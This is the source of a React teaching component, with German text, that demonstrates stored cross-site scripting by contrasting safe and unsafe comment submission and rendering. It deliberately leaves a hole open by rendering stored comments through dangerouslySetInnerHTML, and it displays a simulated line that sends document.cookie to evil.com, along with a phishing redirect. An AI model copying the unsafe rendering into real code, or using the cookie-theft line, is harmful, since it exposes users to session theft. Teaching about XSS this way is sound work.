import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Arrow, TraceBlock, XSS_PAYLOAD, StoredComment, StoredOutput } from "./shared"

// ---------------------------------------------------------------------------
// Internal helpers
// ---------------------------------------------------------------------------

type Phase = "attacker" | "user" | "done"

function PayloadLinks({ onMalicious, onLegit }: { onMalicious: () => void; onLegit: () => void }) {
  return (
    <span className="flex gap-2 text-xs">
      <button
        type="button"
        onClick={onMalicious}
        className="text-destructive underline underline-offset-2 hover:opacity-80"
      >
        Malicious Payload
      </button>
      <span className="text-muted-foreground">|</span>
      <button
        type="button"
        onClick={onLegit}
        className="text-muted-foreground underline underline-offset-2 hover:text-foreground"
      >
        Normaler User Payload
      </button>
    </span>
  )
}

// ---------------------------------------------------------------------------
// StoredXss
// ---------------------------------------------------------------------------

export function StoredXss({ onOutput }: { onOutput: (o: StoredOutput) => void }) {
  const [input, setInput] = useState("")
  const [phase, setPhase] = useState<Phase>("attacker")
  const [attackerSafe, setAttackerSafe] = useState<boolean | null>(null)
  const [attackerComment, setAttackerComment] = useState("")
  const [userResult, setUserResult] = useState<{ safe: boolean; entries: StoredComment[] } | null>(null)
  const [xssTriggered, setXssTriggered] = useState(false)

  useEffect(() => {
    const handler = () => setXssTriggered(true)
    document.addEventListener("xss-triggered", handler)
    return () => document.removeEventListener("xss-triggered", handler)
  }, [])

  async function handleAttackerSubmit(safe: boolean) {
    setXssTriggered(false)
    const endpoint = safe ? "/api/xss/comments-safe" : "/api/xss/comments-unsafe"
    await fetch(endpoint, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(input),
    })
    const submitted = input
    setAttackerComment(submitted)
    setAttackerSafe(safe)
    setInput("")
    setPhase("user")
    onOutput({ attackerSafe: safe, attackerComment: submitted })
  }

  async function handleUserSubmit(safe: boolean) {
    const endpoint = safe ? "/api/xss/comments-safe" : "/api/xss/comments-unsafe"
    await fetch(endpoint, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(input),
    })
    const res = await fetch("/api/xss/comments")
    const entries: StoredComment[] = res.ok ? await res.json() : []
    setUserResult({ safe, entries })
    setPhase("done")
    onOutput({ attackerSafe: attackerSafe!, attackerComment, userSafe: safe, userEntries: entries })
  }

  async function reset() {
    await fetch("/api/xss/comments", { method: "DELETE" })
    setPhase("attacker")
    setInput("")
    setAttackerSafe(null)
    setAttackerComment("")
    setUserResult(null)
    setXssTriggered(false)
  }

  return (
    <div className="flex flex-col gap-4 text-sm">

      {/* ─── Schritt 1: Angreifer ──────────────────────────────────────── */}
      <div className="flex flex-col gap-3">
        <p className="text-xs font-semibold uppercase tracking-wide text-muted-foreground">
          Schritt 1 – Angreifer
        </p>
        <p className="text-sm text-muted-foreground">
          Ein Angreifer legt auf{" "}
          <span className="font-medium">www.seite.at </span> einen Account an
          und trägt im Kommentarfeld einen Schadcode ein.
        </p>

        {phase === "attacker" ? (
          <>
            <div className="flex flex-col gap-1.5">
              <div className="flex items-center justify-between">
                <Label htmlFor="stored-input-attacker">Kommentar posten:</Label>
                <PayloadLinks
                  onMalicious={() => setInput(XSS_PAYLOAD)}
                  onLegit={() => setInput("Ich möchte auch meinen Quargel posten.")}
                />
              </div>
              <Input id="stored-input-attacker" value={input} readOnly />
            </div>
            <div className="flex gap-2">
              <Button type="button" className="flex-1" onClick={() => handleAttackerSubmit(true)}>
                Sicherer Submit-Button
              </Button>
              <Button
                type="button"
                variant="destructive"
                className="flex-1"
                onClick={() => handleAttackerSubmit(false)}
              >
                Unsicherer Submit-Button
              </Button>
            </div>
          </>
        ) : (
          <div className="rounded-md border bg-muted p-2 text-xs flex flex-col gap-1">
            <p className="text-muted-foreground">
              Submitted via {attackerSafe ? "Sicherer" : "Unsicherer"} Submit-Button:
            </p>
            <code className="break-all">{attackerComment}</code>
            <p className={attackerSafe ? "text-green-600" : "text-destructive"}>
              {attackerSafe
                ? "✓ Kein Schadcode kann übergeben werden"
                : "⚠ Der Schadcode wurde unverändert übernommen"}
            </p>
          </div>
        )}
      </div>

      {/* ─── Schritt 2: Legitimer User ─────────────────────────────────── */}
      {phase !== "attacker" && (
        <div className="flex flex-col gap-3 border-t pt-4">
          <p className="text-xs font-semibold uppercase tracking-wide text-muted-foreground">
            Schritt 2 – Legitimer User
          </p>
          {phase === "user" && (
            <>
              <div className="flex flex-col gap-1.5">
                <div className="flex items-center justify-between">
                  <Label htmlFor="stored-input-user">Kommentar suchen:</Label>
                  <PayloadLinks
                    onMalicious={() => setInput(XSS_PAYLOAD)}
                    onLegit={() => setInput("Gib mir alle Post aus.")}
                  />
                </div>
                <Input id="stored-input-user" value={input} readOnly />
              </div>
              <div className="flex gap-2">
                <Button type="button" className="flex-1" onClick={() => handleUserSubmit(true)}>
                  Sicherer Submit-Button
                </Button>
                <Button
                  type="button"
                  variant="destructive"
                  className="flex-1"
                  onClick={() => handleUserSubmit(false)}
                >
                  Unsicherer Submit-Button
                </Button>
              </div>
            </>
          )}

          {phase === "done" && userResult && (
            <div className="flex flex-col gap-2">
              {xssTriggered && (
                <div className="rounded-md bg-destructive/10 border border-destructive px-3 py-2 text-xs text-destructive flex flex-col gap-2">
                  <p className="font-semibold">⚠ XSS erfolgreich! Schadcodesimulation:</p>
                  <pre className="whitespace-pre-wrap font-mono">
                    {`// Session-Cookie stehlen und an Angreifer-Server senden\nfetch('https://evil.com/steal?c=' + document.cookie)\n// oder: Nutzer auf Phishing-Seite weiterleiten\ndocument.location = 'https://phishing-seite.at'\n// oder: Keylogger installieren, formular-daten abfangen, ...`}
                  </pre>
                </div>
              )}

              {userResult.safe ? (
                <p className="text-xs text-green-600">✓ Kein Schadcode wird ausgeführt</p>
              ) : (
                <p className="text-xs text-muted-foreground">
                  Ein anderer User besucht ebenfalls <span className="font-medium">www.seite.at</span> und
                  und möchte sich über das Suchfeld alle Posts ausgeben lassen. Er klickt auf Submit (manchmal reicht es auch schon, die Seite
                  einfach nur zu besuchen) und löst den Schadcode aus.
                </p>
              )}

              {/* ⚠️ UNSICHER: Gespeicherte Einträge werden als HTML gerendert – Stored XSS */}
              {!userResult.safe &&
                userResult.entries.map((e) => (
                  <div
                    key={e.id}
                    className="hidden"
                    dangerouslySetInnerHTML={{ __html: e.content }}
                  />
                ))}
            </div>
          )}
        </div>
      )}

      <button
        type="button"
        onClick={reset}
        className="text-xs text-muted-foreground underline underline-offset-2 hover:text-foreground self-end"
      >
        DB zurücksetzen
      </button>
    </div>
  )
}

// ---------------------------------------------------------------------------
// StoredCodeTrace
// ---------------------------------------------------------------------------

export function StoredCodeTrace({ output }: { output: StoredOutput | null }) {
  if (!output) {
    return (
      <p className="text-xs text-muted-foreground">
        Klicke auf „Sicherer Submit-Button" oder „Unsicherer Submit-Button", um den Code-Ablauf zu
        sehen.
      </p>
    )
  }

  const userDone = output.userSafe !== undefined

  const attackerBackendCode = output.attackerSafe
    ? `// ✅ SICHER: HtmlEncode vor dem Speichern
var sanitized = WebUtility.HtmlEncode(content);
// <  →  &lt;
// >  →  &gt;
// "  →  &quot;
var comment = new Comment(sanitized);
await db.SaveChangesAsync();`
    : `// ⚠️ UNSICHER: Rohinhalt direkt gespeichert
var comment = new Comment(content);
await db.SaveChangesAsync();`

  const dbValue = output.attackerSafe
    ? `&lt;img src=x onerror=&quot;document.dispatchEvent(...)&quot;&gt;`
    : `<img src=x onerror="document.dispatchEvent(new CustomEvent('xss-triggered'))">`

  const renderCode =
    output.userSafe === true
      ? `// ✅ SICHER: React escaped automatisch
entries.map(e => <span>{e.content}</span>)
// → Inhalt wird als plain text angezeigt`
      : `// ⚠️ UNSICHER: dangerouslySetInnerHTML
entries.map(e => (
  <div dangerouslySetInnerHTML={{ __html: e.content }} />
))
// → Inhalt wird als HTML ausgeführt`

  const browserResult =
    output.userSafe === true
      ? `→ Payload wird als Text angezeigt.\n   Kein Event feuert. Kein Schaden.`
      : `→ <img> wird in den DOM eingefügt.\n   src="x" schlägt fehl → onerror feuert.\n   CustomEvent "xss-triggered" dispatched.\n   React Banner: "⚠ XSS erfolgreich!" – für ALLE Besucher.`

  return (
    <div className="flex flex-col gap-3 text-xs">
      <TraceBlock
        step="①"
        label={`POST /api/xss/comments-${output.attackerSafe ? "safe" : "unsafe"} (Angreifer)`}
      >
        {`"${output.attackerComment}"`}
      </TraceBlock>

      <Arrow />

      <TraceBlock
        step="②"
        label={output.attackerSafe ? "XssController – sicher" : "XssController – unsicher"}
      >
        {attackerBackendCode}
      </TraceBlock>

      <Arrow />

      <TraceBlock step="③" label="Gespeichert in DB">
        {dbValue}
      </TraceBlock>

      {userDone && (
        <>
          <Arrow />

          <TraceBlock step="④" label="GET /api/xss/comments (Legitimer User lädt Seite)">
            {`// Alle gespeicherten Einträge werden abgerufen\nreturn Ok(await db.Comments.OrderBy(c => c.CreatedAt).ToListAsync());`}
          </TraceBlock>

          <Arrow />

          <TraceBlock
            step="⑤"
            label={
              output.userSafe
                ? "Frontend rendert sicher (JSX)"
                : "Frontend rendert unsicher (dangerouslySetInnerHTML)"
            }
          >
            {renderCode}
          </TraceBlock>

          <Arrow />

          <TraceBlock
            step="⑥"
            label={
              output.userSafe
                ? "Browser zeigt Text – kein Script ausgeführt"
                : "Browser führt Script aus"
            }
          >
            {browserResult}
          </TraceBlock>
        </>
      )}
    </div>
  )
}
